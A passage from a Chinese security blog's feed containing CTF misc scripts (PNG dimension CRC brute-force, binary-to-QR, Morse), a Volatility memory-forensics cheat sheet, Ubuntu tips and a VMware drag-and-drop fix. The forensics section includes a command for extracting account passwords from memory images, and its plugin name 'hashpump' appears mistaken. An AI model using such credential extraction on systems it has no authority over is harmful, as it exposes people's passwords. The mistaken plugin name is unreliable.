class="token punctuation">(</span>crc<span class="token punctuation">)</span><span class="token punctuation">:</span>              <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"爆破成功!"</span><span class="token punctuation">)</span>              <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"正确的宽高:"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>w<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>h<span class="token punctuation">)</span><span class="token punctuation">)</span>              check <span class="token operator">=</span> <span class="token number">1</span>              <span class="token keyword">break</span>  <span class="token keyword">if</span> check <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"爆破失败！"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="01序列转二维码"><a href="#01序列转二维码" class="headerlink" title="01序列转二维码"></a>01序列转二维码</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image    key <span class="token operator">=</span> <span class="token string">""</span>  <span class="token comment"># 二维码01序列  </span>MAX <span class="token operator">=</span> <span class="token number">25</span>  <span class="token comment"># 二维码的长宽  </span>pic <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"RGB"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>MAX<span class="token punctuation">,</span> MAX<span class="token punctuation">)</span><span class="token punctuation">)</span>  white <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span>  black <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>  i <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> MAX<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> MAX<span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token keyword">if</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>              pic<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">,</span> y<span class="token punctuation">]</span><span class="token punctuation">,</span> black<span class="token punctuation">)</span>          <span class="token keyword">else</span><span class="token punctuation">:</span>              pic<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">,</span> y<span class="token punctuation">]</span><span class="token punctuation">,</span> white<span class="token punctuation">)</span>          i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>  pic<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="摩斯密码加解密"><a href="#摩斯密码加解密" class="headerlink" title="摩斯密码加解密"></a>摩斯密码加解密</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">MORSE_CODE_DICT <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'A'</span><span class="token punctuation">:</span> <span class="token string">'.-'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">:</span> <span class="token string">'-...'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">:</span> <span class="token string">'-.-.'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">:</span> <span class="token string">'-..'</span><span class="token punctuation">,</span>                     <span class="token string">'E'</span><span class="token punctuation">:</span> <span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'F'</span><span class="token punctuation">:</span> <span class="token string">'..-.'</span><span class="token punctuation">,</span> <span class="token string">'G'</span><span class="token punctuation">:</span> <span class="token string">'--.'</span><span class="token punctuation">,</span> <span class="token string">'H'</span><span class="token punctuation">:</span> <span class="token string">'....'</span><span class="token punctuation">,</span>                     <span class="token string">'I'</span><span class="token punctuation">:</span> <span class="token string">'..'</span><span class="token punctuation">,</span> <span class="token string">'J'</span><span class="token punctuation">:</span> <span class="token string">'.---'</span><span class="token punctuation">,</span> <span class="token string">'K'</span><span class="token punctuation">:</span> <span class="token string">'-.-'</span><span class="token punctuation">,</span> <span class="token string">'L'</span><span class="token punctuation">:</span> <span class="token string">'.-..'</span><span class="token punctuation">,</span>                     <span class="token string">'M'</span><span class="token punctuation">:</span> <span class="token string">'--'</span><span class="token punctuation">,</span> <span class="token string">'N'</span><span class="token punctuation">:</span> <span class="token string">'-.'</span><span class="token punctuation">,</span> <span class="token string">'O'</span><span class="token punctuation">:</span> <span class="token string">'---'</span><span class="token punctuation">,</span> <span class="token string">'P'</span><span class="token punctuation">:</span> <span class="token string">'.--.'</span><span class="token punctuation">,</span>                     <span class="token string">'Q'</span><span class="token punctuation">:</span> <span class="token string">'--.-'</span><span class="token punctuation">,</span> <span class="token string">'R'</span><span class="token punctuation">:</span> <span class="token string">'.-.'</span><span class="token punctuation">,</span> <span class="token string">'S'</span><span class="token punctuation">:</span> <span class="token string">'...'</span><span class="token punctuation">,</span> <span class="token string">'T'</span><span class="token punctuation">:</span> <span class="token string">'-'</span><span class="token punctuation">,</span>                     <span class="token string">'U'</span><span class="token punctuation">:</span> <span class="token string">'..-'</span><span class="token punctuation">,</span> <span class="token string">'V'</span><span class="token punctuation">:</span> <span class="token string">'...-'</span><span class="token punctuation">,</span> <span class="token string">'W'</span><span class="token punctuation">:</span> <span class="token string">'.--'</span><span class="token punctuation">,</span> <span class="token string">'X'</span><span class="token punctuation">:</span> <span class="token string">'-..-'</span><span class="token punctuation">,</span>                     <span class="token string">'Y'</span><span class="token punctuation">:</span> <span class="token string">'-.--'</span><span class="token punctuation">,</span> <span class="token string">'Z'</span><span class="token punctuation">:</span> <span class="token string">'--..'</span><span class="token punctuation">,</span>                     <span class="token string">'0'</span><span class="token punctuation">:</span> <span class="token string">'-----'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">:</span> <span class="token string">'.----'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">:</span> <span class="token string">'..---'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">:</span> <span class="token string">'...--'</span><span class="token punctuation">,</span>                     <span class="token string">'4'</span><span class="token punctuation">:</span> <span class="token string">'....-'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">:</span> <span class="token string">'.....'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">:</span> <span class="token string">'-....'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">:</span> <span class="token string">'--...'</span><span class="token punctuation">,</span>                     <span class="token string">'8'</span><span class="token punctuation">:</span> <span class="token string">'---..'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">:</span> <span class="token string">'----.'</span><span class="token punctuation">,</span>                     <span class="token string">'.'</span><span class="token punctuation">:</span> <span class="token string">'.-.-.-'</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">:</span> <span class="token string">'---...'</span><span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">:</span> <span class="token string">'--..--'</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">:</span> <span class="token string">'-.-.-.'</span><span class="token punctuation">,</span>                     <span class="token string">'?'</span><span class="token punctuation">:</span> <span class="token string">'..--..'</span><span class="token punctuation">,</span> <span class="token string">'='</span><span class="token punctuation">:</span> <span class="token string">'-...-'</span><span class="token punctuation">,</span> <span class="token string">'\''</span><span class="token punctuation">:</span> <span class="token string">'.----.'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">:</span> <span class="token string">'-..-.'</span><span class="token punctuation">,</span>                     <span class="token string">'!'</span><span class="token punctuation">:</span> <span class="token string">'-.-.--'</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">:</span> <span class="token string">'-....-'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">:</span> <span class="token string">'..--.-'</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">:</span> <span class="token string">'.-..-.'</span><span class="token punctuation">,</span>                     <span class="token string">'('</span><span class="token punctuation">:</span> <span class="token string">'-.--.'</span><span class="token punctuation">,</span> <span class="token string">')'</span><span class="token punctuation">:</span> <span class="token string">'-.--.-'</span><span class="token punctuation">,</span> <span class="token string">'$'</span><span class="token punctuation">:</span> <span class="token string">'...-..-'</span><span class="token punctuation">,</span> <span class="token string">'&amp;'</span><span class="token punctuation">:</span> <span class="token string">'....'</span><span class="token punctuation">,</span>                     <span class="token string">'@'</span><span class="token punctuation">:</span> <span class="token string">'.--.-.'</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">:</span> <span class="token string">'.-.-.'</span><span class="token punctuation">,</span>                     <span class="token punctuation">&#125;</span>      <span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>      cipher <span class="token operator">=</span> <span class="token string">''</span>      <span class="token keyword">for</span> s <span class="token keyword">in</span> message<span class="token punctuation">:</span>          cipher <span class="token operator">+=</span> MORSE_CODE_DICT<span class="token punctuation">.</span>get<span class="token punctuation">(</span>s<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span>          <span class="token keyword">if</span> s <span class="token operator">!=</span> message<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>              cipher <span class="token operator">+=</span> <span class="token string">' '</span>  <span class="token comment"># 每加密一个字符用空格隔开  </span>    <span class="token keyword">return</span> cipher      <span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>      message <span class="token operator">+=</span> <span class="token string">' '</span>  <span class="token comment"># 在末尾添加额外空间以访问最后一个摩斯密码  </span>    decipher <span class="token operator">=</span> <span class="token string">''</span>      citext <span class="token operator">=</span> <span class="token string">''</span>      <span class="token keyword">global</span> i      <span class="token keyword">for</span> letter <span class="token keyword">in</span> message<span class="token punctuation">:</span>          <span class="token keyword">if</span> letter <span class="token operator">!=</span> <span class="token string">' '</span><span class="token punctuation">:</span>              i <span class="token operator">=</span> <span class="token number">0</span>              citext <span class="token operator">+=</span> letter          <span class="token keyword">else</span><span class="token punctuation">:</span>              i <span class="token operator">+=</span> <span class="token number">1</span>  <span class="token comment"># 如果i=1表示一个新字符  </span>            <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>  <span class="token comment"># 如果i=2表示一个新单词  </span>                decipher <span class="token operator">+=</span> <span class="token string">' '</span>  <span class="token comment"># 添加空格来分隔单词  </span>            <span class="token keyword">else</span><span class="token punctuation">:</span>  <span class="token comment"># 使用它们的值访问密钥（加密的反向）  </span>                decipher <span class="token operator">+=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>MORSE_CODE_DICT<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token builtin">list</span><span class="token punctuation">(</span>MORSE_CODE_DICT<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>index<span class="token punctuation">(</span>citext<span class="token punctuation">)</span><span class="token punctuation">]</span>                  citext <span class="token operator">=</span> <span class="token string">''</span>      <span class="token keyword">return</span> decipher      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"           摩斯加解密系统             "</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"*************************************"</span><span class="token punctuation">)</span>    num <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"选择要进行的操作? (1:加密 or 2:解密) 你的选择: "</span><span class="token punctuation">)</span>  <span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token string">"1"</span> <span class="token keyword">or</span> num <span class="token operator">==</span> <span class="token string">"1:加密"</span><span class="token punctuation">:</span>      input_str <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"输入明文以加密: "</span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span>encrypt<span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">elif</span> num <span class="token operator">==</span> <span class="token string">"2"</span> <span class="token keyword">or</span> num <span class="token operator">==</span> <span class="token string">"2:解密"</span><span class="token punctuation">:</span>      input_str <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"输入密文以解密: "</span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span>decrypt<span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr>]]></content>
    
    
    <summary type="html">杂项中的一些脚本，有的在线网站也可以实现，不过还是自己总结了一些，可以方便根据自己的需求修改源码</summary>
    
    
    
    <category term="便捷算法" scheme="https://www.4ss1du0us.cn/categories/%E4%BE%BF%E6%8D%B7%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
    
    <category term="MISC" scheme="https://www.4ss1du0us.cn/tags/MISC/"/>
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>内存取证</title>
    <link href="https://www.4ss1du0us.cn/2023/055090002e.html"/>
    <id>https://www.4ss1du0us.cn/2023/055090002e.html</id>
    <published>2023-05-08T07:56:58.000Z</published>
    <updated>2023-05-11T05:27:22.076Z</updated>
    
    <content type="html"><![CDATA[<h2 id="volatility-的安装"><a href="#volatility-的安装" class="headerlink" title="volatility 的安装"></a>volatility 的安装</h2><blockquote><p>Volatility 是一款开源的内存取证分析工具，支持 Windows、Linux、Mac、Android 等多类型操作系统系统的内存取证方式。该工具由 python 开发，<strong>volatility2 支持 python2</strong>、<strong>volatility3 支持 python3</strong> 环境</p></blockquote><ul><li><p>通过 snap 安装</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> snap <span class="token function">install</span> volatility-phocean<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>通过 git 安装 volatility3（需先安装 python3 环境）</p></li></ul><blockquote><p>Github地址：<a href="https://github.com/volatilityfoundation/volatility3">https://github.com/volatilityfoundation/volatility3</a></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/volatilityfoundation/volatility3<span class="token builtin class-name">cd</span> volatility3pip3 <span class="token function">install</span> <span class="token parameter variable">-r</span> requirements-minimal.txt<span class="token function">sudo</span> python3 setup.py build <span class="token function">sudo</span> python3 setup.py <span class="token function">install</span><span class="token function">sudo</span> python3 vol.py <span class="token parameter variable">-h</span>   <span class="token comment"># 验证安装</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="volalitily-的使用"><a href="#volalitily-的使用" class="headerlink" title="volalitily 的使用"></a>volalitily 的使用</h2><blockquote><p>常见的取证文件后缀名为：raw、vmem、img、dmg</p><p>命令中 <code>volatility</code> 可以替换为 <code>python3 vol.py</code></p></blockquote><hr><h3 id="获取系统基本信息"><a href="#获取系统基本信息" class="headerlink" title="获取系统基本信息"></a>获取系统基本信息</h3><blockquote><p><strong>首先必须通过此命令获取系统版本信息，如果操作系统错误，是无法正确读取内存信息的</strong></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 imageinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 filescanvolatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 filescan <span class="token operator">|</span> <span class="token function">grep</span> xxxvolatility <span class="token parameter variable">-f</span> 镜像名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 filescan <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-E</span> <span class="token string">'jpg|png|jpeg|bmp|gif'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h3 id="提取文件"><a href="#提取文件" class="headerlink" title="提取文件"></a>提取文件</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 dumpfiles <span class="token parameter variable">-Q</span> 内存地址 --dump-dir<span class="token operator">=</span>保存路径<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="列出进程信息"><a href="#列出进程信息" class="headerlink" title="列出进程信息"></a>列出进程信息</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本  pslist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="提取进程内容"><a href="#提取进程内容" class="headerlink" title="提取进程内容"></a>提取进程内容</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 memdump <span class="token parameter variable">-p</span> 进程的PID <span class="token parameter variable">-D</span> 保存路径<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="获取浏览器浏览历史"><a href="#获取浏览器浏览历史" class="headerlink" title="获取浏览器浏览历史"></a>获取浏览器浏览历史</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 iehistory<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="获取内存中的注册表"><a href="#获取内存中的注册表" class="headerlink" title="获取内存中的注册表"></a>获取内存中的注册表</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 hivelist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="查看截图"><a href="#查看截图" class="headerlink" title="查看截图"></a>查看截图</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 screenshot --dump-dir<span class="token operator">=</span>保存路径<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="获取-cmd-输入"><a href="#获取-cmd-输入" class="headerlink" title="获取 cmd 输入"></a>获取 cmd 输入</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 cmdline<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="查看-cmd-执行的文件"><a href="#查看-cmd-执行的文件" class="headerlink" title="查看 cmd 执行的文件"></a>查看 cmd 执行的文件</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 cmdscan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="提取账户密码"><a href="#提取账户密码" class="headerlink" title="提取账户密码"></a>提取账户密码</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 hashpump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="查看网络连接"><a href="#查看网络连接" class="headerlink" title="查看网络连接"></a>查看网络连接</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 netscanvolatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 netscan<span class="token operator">|</span><span class="token function">grep</span> ESTABLISHED   <span class="token comment"># 查看已建立的网络连接</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h3 id="查看桌面文件"><a href="#查看桌面文件" class="headerlink" title="查看桌面文件"></a>查看桌面文件</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 filescan <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"Desktop"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr>]]></content>
    
    
    <summary type="html">使用 Volatility 进行内存取证的一些指令，包括安装和具体使用</summary>
    
    
    
    <category term="杂项" scheme="https://www.4ss1du0us.cn/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
    
    <category term="MISC" scheme="https://www.4ss1du0us.cn/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu22.04操作指令</title>
    <link href="https://www.4ss1du0us.cn/2023/057645d679.html"/>
    <id>https://www.4ss1du0us.cn/2023/057645d679.html</id>
    <published>2023-05-02T07:23:24.000Z</published>
    <updated>2023-05-11T05:21:10.344Z</updated>
    
    <content type="html"><![CDATA[<h2 id="修改-host-并清除-DNS-缓存"><a href="#修改-host-并清除-DNS-缓存" class="headerlink" title="修改 host 并清除 DNS 缓存"></a>修改 host 并清除 DNS 缓存</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/hosts<span class="token comment"># 检查目前的缓存大小</span>resolvectl statistics<span class="token comment"># 清理缓存，清理完后 Current Cache Size 变为 0</span>resolvectl flush-caches<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="为应用创建桌面图标"><a href="#为应用创建桌面图标" class="headerlink" title="为应用创建桌面图标"></a>为应用创建桌面图标</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> ~/桌面<span class="token function">sudo</span> <span class="token function">vim</span> 程序名.desktop<span class="token comment"># 写入如下内容：</span>-------------------------------------------<span class="token punctuation">[</span>Desktop Entry<span class="token punctuation">]</span><span class="token assign-left variable">Name</span><span class="token operator">=</span>  <span class="token comment"># 程序名</span><span class="token assign-left variable">Comment</span><span class="token operator">=</span>  <span class="token comment"># 程序名</span><span class="token assign-left variable">Exec</span><span class="token operator">=</span>  <span class="token comment"># 程序路径</span><span class="token assign-left variable">Icon</span><span class="token operator">=</span>  <span class="token comment"># 应用的图标，形如 xxx.png</span><span class="token assign-left variable">Terminal</span><span class="token operator">=</span>false<span class="token assign-left variable">Type</span><span class="token operator">=</span>Application<span class="token assign-left variable">Categories</span><span class="token operator">=</span>Developer<span class="token punctuation">;</span>-------------------------------------------<span class="token comment"># 增加执行权限</span><span class="token function">sudo</span> <span class="token function">chmod</span> a+x 程序名.desktop<span class="token comment"># 在桌面图标上右键，选择 "允许运行"，双击图标验证是否能成功打开</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr>]]></content>
    
    
    <summary type="html">一些日常使用 Ubuntu 的指令</summary>
    
    
    
    <category term="Linux" scheme="https://www.4ss1du0us.cn/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://www.4ss1du0us.cn/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>从物理机拖到Linux虚拟机中的文件消失了？</title>
    <link href="https://www.4ss1du0us.cn/2023/0441d1faf8.html"/>
    <id>https://www.4ss1du0us.cn/2023/0441d1faf8.html</id>
    <published>2023-04-29T12:36:24.000Z</published>
    <updated>2023-05-14T00:41:54.321Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><blockquote><p>有时候虚拟机像是 bug 了一样，明明安装了 VMtools，从物理机拖放文件还是会失败：</p><ol><li><p>如果直接将文件拖进虚拟机会显示 🚫，不妨试试在物理机中将文件复制后粘贴到虚拟机哦（如果还是不行，试试重装  VMtools）</p></li><li><p>但有时候将文件拖进虚拟机没有显示 🚫，文件也拖放成功了，但文件却并没有出现在对应的文件夹中，当然这就是本文要解决的问题</p></li></ol></blockquote><ul><li>以物理机往 Ubuntu 虚拟机拖放 <code>CLion</code> 为例：</li></ul><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%861.png" alt="从物理机拖到Linux虚拟机中的文件消失了1.png"></p><ol><li>可以看到，虚拟机没有提示 🚫，拖放操作是没有问题的</li></ol><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%862.png" alt="从物理机拖到Linux虚拟机中的文件消失了2.png"></p><ol start="2"><li>拖放后，物理机开始复制文件到 Ubuntu 虚拟机</li></ol><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%863.png" alt="从物理机拖到Linux虚拟机中的文件消失了3.png"></p><ol start="3"><li>但是发现复制结束后，桌面上什么都没有，左上角还有个像卡 bug 了一样的白图标</li></ol><hr><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><blockquote><p>其实，如果在拖放文件到虚拟机的时候没有显示 🚫，并且会有一个 <code>正在将文件 &quot;xxx&quot; 复制到虚拟机</code> 的弹窗，那说明文件是已经成功移到虚拟机了，只是没有移到你想放的文件夹下</p><p><strong>VMware Workstation 会将用户拖放到虚拟机的文件存放在一个叫 <code>drag_and_drop</code> 的文件夹内，只需手动操作一下即可</strong></p></blockquote><hr><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><ol><li>打开主目录，并在主目录里打开终端（或直接 <code>cd ~</code>）<br><code>ls -a</code> 查看主目录下所有文件</li></ol><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%864.png" alt="从物理机拖到Linux虚拟机中的文件消失了4.png"></p><ol start="2"><li>进到名为 <code>.cache</code> 的隐藏文件夹，一路 <code>ls -a</code> 查看，并进到 <code>~/.cache/vmware/drag_and_drop</code> 